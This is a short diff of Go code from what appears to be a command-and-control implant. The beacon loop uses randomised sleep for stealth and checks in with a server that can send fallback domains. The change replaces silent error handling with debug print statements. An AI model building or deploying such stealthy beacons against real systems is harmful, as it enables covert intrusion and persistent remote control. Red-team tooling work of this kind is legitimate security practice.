@@ -445,15 +445,18 @@ func (b *Beacon) runBeacon() {
 	for b.running {
 		// Randomize sleep interval between min and max for OPSEC
 		sleepDuration := time.Duration(sleepMin+rand.Intn(sleepMax-sleepMin+1)) * time.Second
+		fmt.Printf("[Beacon] Sleeping for %v seconds...\n", sleepDuration.Seconds())
 		time.Sleep(sleepDuration)
 
 		// Send check-in - if it fails, beacon continues trying
+		fmt.Printf("[Beacon] Sending check-in...\n")
 		response, err := b.checkIn()
 		if err != nil {
-			// Silent failure for stealth - beacon will retry on next iteration
-			// Domain selection already handles failover and retry logic
+			// Log failure for debugging
+			fmt.Printf("[Beacon] Check-in failed: %v, retrying after next sleep\n", err)
 			continue
 		}
+		fmt.Printf("[Beacon] Check-in response: %s\n", response)
 
 		// Check for DOMAINS response (sent on first check-in)
 		if strings.HasPrefix(response, "DOMAINS|") {
